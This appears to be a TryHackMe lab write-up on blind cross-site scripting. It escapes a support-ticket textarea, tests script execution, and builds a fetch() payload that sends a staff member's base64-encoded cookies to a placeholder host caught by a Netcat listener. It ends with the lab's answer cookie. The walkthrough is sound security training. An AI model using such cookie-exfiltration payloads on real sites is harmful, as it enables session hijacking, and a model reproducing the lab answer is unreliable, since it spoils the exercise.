# Blind XSS Practical

-  You’ll need to use the `AttackBox` using the **<ins>blue</ins>** button at the top of the page. 

- Once loaded, open the link below inside the AttackBox’s Firefox browser to view the target website.

```
https://THM_LAB_IP_ADDRESS.p.thmlabs.com
```

  ![image](https://user-images.githubusercontent.com/63872951/187017813-146b952b-9d44-4ecd-a940-2861ccdc5bc4.png)

# Steps to follow:

- Click on the `Customers` tab on the top navigation bar and click the `"Signup here"` link to create an account. 

  ![image](https://user-images.githubusercontent.com/63872951/187017889-1a09dfad-cdee-49de-8bad-5c903d7bd35f.png)

  ![image](https://user-images.githubusercontent.com/63872951/187018793-c11381dd-7983-410c-a6c8-e03aa1135670.png)

  
- Once your account gets set up, click the `Support Tickets` tab, which is the feature we will investigate for weaknesses. 

  ![image](https://user-images.githubusercontent.com/63872951/187018880-3d273273-8572-4676-9876-dffcdf793a1d.png)

- Try creating a support ticket by clicking the green `Create Ticket` button, enter the subject and content of just the word `"test"` and then click the blue Create Ticket button. 

- You'll now notice your new ticket in the ***list*** with an ***id*** number which you can click to take you to your newly created ticket. 

  ![image](https://user-images.githubusercontent.com/63872951/187018950-f3bb7f5a-d8b2-4467-8aa8-ed83cfeafd70.png)

  ![image](https://user-images.githubusercontent.com/63872951/187018980-03fe8f03-c437-4cc0-b936-7dfe0f77c62d.png)

- We will investigate how the ***previously entered text*** gets reflected on the page. 

- Upon viewing the page source, we can see the text gets placed inside a `textarea` tag.

  ![image](https://user-images.githubusercontent.com/63872951/187019068-47ecdd76-90cc-42ca-8e5f-03e553840916.png)

# Tampering

- Let's now go back and create another ticket. Let's see if we can escape the `textarea` tag by entering the following **[payload 1](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/12%20-%20Blind%20XSS%20Practical/Used%20Payloads/payload1.js)** into the ticket contents:

  ```
  </textarea>test
  ```

- Again, opening the ticket and viewing the ***page source***, we've `successfully escaped` the `textarea` tag. 

  ![image](https://user-images.githubusercontent.com/63872951/187019217-dc231929-0240-41b9-9adc-865f2a803fd0.png)

- Let's now expand on this payload to see if we can `run JavaScript` and confirm that the ticket creation feature is ***vulnerable to an XSS*** attack. 

- Try another new ticket with the following **[payload 2](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/12%20-%20Blind%20XSS%20Practical/Used%20Payloads/payload2.js)**:
  
  ```js
  </textarea><script>alert('THM');</script>
  ```

- Now when you view the ticket, you should get an alert box with the `string THM`. 

  ![image](https://user-images.githubusercontent.com/63872951/187019314-1302c876-3992-484d-88cf-f405ab2e2eaa.png)

- We're going to now expand the payload even further and increase the vulnerabilities impact. 

- Because this feature is creating a support ticket, we can be reasonably confident that a staff member will also view this ticket which we could get to execute JavaScript.  
# Using NetCat

- Some helpful information to extract from another user would be their ***cookies***, which we could use to ***elevate our privileges*** by hijacking their `login session`. 

- To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. 

- Firstly, we'll need to set up a listening server to receive the information using `Netcat`

  ![image](https://user-images.githubusercontent.com/63872951/187019471-bcd89f02-cf06-49ac-8171-63c5c60a3e4f.png)
  
- Now that we've set up the method of receiving the exfiltrated information, let's build the [payload](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/12%20-%20Blind%20XSS%20Practical/Used%20Payloads/payload3.js).
  ```js
  </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
  ```

# [Used Payloads](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/tree/main/12%20-%20Blind%20XSS%20Practical/Used%20Payloads)

## Let's breakdown the payload to be used in this step:

- The `</textarea>` tag closes the textarea field. 

- The `<script>` tag opens open an area for us to write JavaScript.

- The `fetch()` command makes an HTTP request.

- `{URL_OR_IP}` is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.

- `?cookie=` is the query string that will contain the victim's cookies.

- `btoa()` command base64 encodes the victim's cookies.

- `document.cookie` accesses the victim's cookies for the Acme IT Support Website.

- `</script>` closes the JavaScript code block.

- Now create another ticket using the **[above payload 3](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/12%20-%20Blind%20XSS%20Practical/Used%20Payloads/payload3.js)**, making sure to swap out the `{URL_OR_IP:Port}` variable to your settings `(make sure to specify the port number as well for the Netcat listener)`. 

- Now, wait up to a minute, and you'll see the ***request*** come through containing the victim's cookies. Here's what I received:

  ![image](https://user-images.githubusercontent.com/63872951/187019934-f484c88e-c610-47f4-bd2f-f1abe27803ba.png)
  
- You can now base64 decode this information using a site like https://www.base64decode.org/, giving you the necessary information to answer the below question.


What is the value of the staff-session cookie?
```
4AB305E55955197693F01D6F8FD2D321
```
